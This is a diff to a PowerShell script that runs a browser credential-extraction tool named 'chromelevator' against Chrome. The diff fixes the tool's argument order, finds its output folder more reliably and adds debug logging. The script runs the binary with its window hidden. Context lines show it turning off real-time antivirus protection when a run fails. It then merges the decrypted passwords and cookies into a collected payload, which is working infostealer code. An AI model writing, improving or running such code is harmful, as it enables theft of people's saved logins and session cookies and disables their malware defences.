@@ -253,6 +253,26 @@ function Protect-ChromelevatorBinary {
     Write-Host "[DEBUG] chromelevator binary marked safe ($size bytes)"
 }
 
+function Resolve-ChromelevatorChromeRoot {
+    param(
+        [string]$OutputRoot,
+        [string]$ElevatorPath
+    )
+
+    $candidates = @(
+        (Join-Path $OutputRoot "Chrome")
+        (Join-Path (Split-Path -Parent $ElevatorPath) "output\Chrome")
+    )
+
+    foreach ($candidate in $candidates) {
+        if (Test-Path -LiteralPath $candidate) {
+            return $candidate
+        }
+    }
+
+    return $null
+}
+
 function Invoke-ChromelevatorProcess {
     param(
         [string]$ElevatorPath,
@@ -266,19 +286,38 @@ function Invoke-ChromelevatorProcess {
 
         $process = New-Object System.Diagnostics.Process
         $process.StartInfo.FileName = $Path
-        $process.StartInfo.Arguments = "chrome -o `"$OutputDir`""
+        # chromelevator syntax: [options] <chrome|edge|...>  — options must come before browser target
+        $process.StartInfo.Arguments = "-k -o `"$OutputDir`" chrome"
         $process.StartInfo.UseShellExecute = $false
         $process.StartInfo.CreateNoWindow = $true
         $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+        $process.StartInfo.RedirectStandardOutput = $true
+        $process.StartInfo.RedirectStandardError = $true
         [void]$process.Start()
+        $stdout = $process.StandardOutput.ReadToEnd()
+        $stderr = $process.StandardError.ReadToEnd()
         $process.WaitForExit()
-        return $process.ExitCode
+
+        if ($stdout.Trim()) {
+            Write-Host "[DEBUG] chromelevator stdout:"
+            Write-Host $stdout
+        }
+        if ($stderr.Trim()) {
+            Write-Host "[DEBUG] chromelevator stderr:"
+            Write-Host $stderr
+        }
+
+        return [pscustomobject]@{
+            ExitCode = $process.ExitCode
+            StdOut = $stdout
+            StdErr = $stderr
+        }
     }
 
     try {
-        $exitCode = Start-ChromelevatorExe -Path $ElevatorPath -OutputDir $OutDir
-        if ($exitCode -ne 0) {
-            throw "chromelevator exited with code $exitCode"
+        $result = Start-ChromelevatorExe -Path $ElevatorPath -OutputDir $OutDir
+        if ($result.ExitCode -ne 0) {
+            throw "chromelevator exited with code $($result.ExitCode)"
         }
         return
     }
@@ -297,9 +336,9 @@ function Invoke-ChromelevatorProcess {
         Write-Host "[DEBUG] Real-time protection disabled temporarily"
         Start-Sleep -Seconds 2
         Protect-ChromelevatorBinary -ElevatorPath $ElevatorPath
-        $exitCode = Start-ChromelevatorExe -Path $ElevatorPath -OutputDir $OutDir
-        if ($exitCode -ne 0) {
-            throw "chromelevator exited with code $exitCode"
+        $result = Start-ChromelevatorExe -Path $ElevatorPath -OutputDir $OutDir
+        if ($result.ExitCode -ne 0) {
+            throw "chromelevator exited with code $($result.ExitCode)"
         }
     }
     catch {
@@ -328,13 +367,16 @@ function Get-NormalizedPasswordKey {
 function Merge-ChromelevatorPasswords {
     param(
         [object]$Payload,
-        [string]$OutputRoot
+        [string]$OutputRoot,
+        [string]$ElevatorPath
     )
 
-    $chromeRoot = Join-Path $OutputRoot "Chrome"
-    if (-not (Test-Path $chromeRoot)) {
-        throw "chromelevator output not found at $chromeRoot"
+    $chromeRoot = Resolve-ChromelevatorChromeRoot -OutputRoot $OutputRoot -ElevatorPath $ElevatorPath
+    if (-not $chromeRoot) {
+        throw "chromelevator output not found under $OutputRoot (expected Chrome\Default\passwords.json)"
     }
+
+    Write-Host "[DEBUG] chromelevator output root: $chromeRoot"
 
     $abeMap = @{}
     foreach ($profileDir in Get-ChildItem -Path $chromeRoot -Directory) {
@@ -387,11 +429,12 @@ function Merge-ChromelevatorPasswords {
 function Merge-ChromelevatorCookies {
     param(
         [object]$Payload,
-        [string]$OutputRoot
+        [string]$OutputRoot,
+        [string]$ElevatorPath
     )
 
-    $chromeRoot = Join-Path $OutputRoot "Chrome"
-    if (-not (Test-Path $chromeRoot)) {
+    $chromeRoot = Resolve-ChromelevatorChromeRoot -OutputRoot $OutputRoot -ElevatorPath $ElevatorPath
+    if (-not $chromeRoot) {
         return 0
     }
 
@@ -553,8 +596,8 @@ function Invoke-ChromelevatorExtraction {
         Write-Host "[DEBUG] Running chromelevator for App-Bound (v20) data..."
         Invoke-ChromelevatorProcess -ElevatorPath $elevatorPath -OutDir $outDir
 
-        $mergedCount = Merge-ChromelevatorPasswords -Payload $Payload -OutputRoot $outDir
-        $cookiesMergedCount = Merge-ChromelevatorCookies -Payload $Payload -OutputRoot $outDir
+        $mergedCount = Merge-ChromelevatorPasswords -Payload $Payload -OutputRoot $outDir -ElevatorPath $elevatorPath
+        $cookiesMergedCount = Merge-ChromelevatorCookies -Payload $Payload -OutputRoot $outDir -ElevatorPath $elevatorPath
         $meta.used = $true
         $meta.abeMergedCount = $mergedCount
         $meta.cookiesMergedCount = $cookiesMergedCount
